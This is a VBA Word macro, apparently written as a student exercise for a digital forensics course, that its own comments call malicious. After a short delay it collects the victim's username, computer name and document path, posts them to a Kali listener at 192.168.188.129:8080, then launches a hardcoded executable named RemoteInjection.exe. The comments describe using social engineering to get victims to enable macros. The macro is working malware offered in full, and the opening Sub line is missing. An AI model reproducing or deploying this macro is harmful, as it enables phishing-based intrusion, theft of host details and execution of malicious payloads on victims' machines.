' This is a malicious Word macro made by Hiller Hoover on 2/16/2026 for DFOR 740.
' It has a hardcoded malicious EXE, and for this to work, must be saved in a macro-enabled word file.
' It must also be placed into the 'ThisDocument' folder in the VBA editor.
' Social engineering would be used to decieve a victim to open and enable macros.

' Small timer function to allow Word to open and user to interact before message box and Notepad pop up.
Dim endTime As Double
endTime = Timer + 3
    Do While Timer < endTime
        DoEvents
    Loop

Dim networkObj As Object, objHTTP As Object
Dim userName As String, computerName As String, workbookPath As String, exePath As String, URL As String, payload As String

' Retrieving System Information (networkObj is necessary to get info)
Set networkObj = CreateObject("WScript.Network")
userName = networkObj.userName
computerName = networkObj.computerName
workbookPath = ActiveDocument.Path
    
' Sending as a simple string for easy reading in Netcat
payload = "User: " & userName & " | " & _
"Computer: " & computerName & " | " & _
"Path: " & workbookPath

' Sending the HTTP POST
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
URL = "http://192.168.188.129:8080" ' IP & port of Kali listener
' Last parameter being false means this is synchronous, so it runs before the malware
objHTTP.Open "POST", URL, False
objHTTP.send payload

'Executing the malware
exePath = "C:\Users\hhoover\Desktop\RemoteInjection.exe"
Shell exePath

MsgBox "You should not have clicked this macro!"

End Sub